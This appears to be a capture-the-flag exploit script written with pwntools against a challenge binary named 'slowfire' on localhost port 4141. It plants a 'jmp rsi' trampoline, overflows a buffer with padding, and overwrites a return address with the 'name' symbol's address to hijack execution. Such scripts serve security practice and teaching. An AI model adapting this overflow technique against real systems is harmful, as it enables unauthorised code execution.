import pwn

hostname = 'localhost'

def get_name_symbol():
    f = pwn.elf.ELF('../challenge/src/slowfire')
    return f.symbols['name']

def main():
    sock = pwn.connect(hostname, 4141)
    sock.readuntil('> ')
    # trampoline
    sock.sendline(pwn.asm('jmp rsi', bits=64))
    sock.readuntil('> ')
    init_len = 1020
    prefix = '\xcc'
    sock.send(prefix + 'A'*(init_len-len(prefix)))
    sock.send('A'*60+pwn.p64(get_name_symbol()))
    print(sock.readuntil('!\n'))
    print(sock.read())

if __name__ == '__main__':
    main()
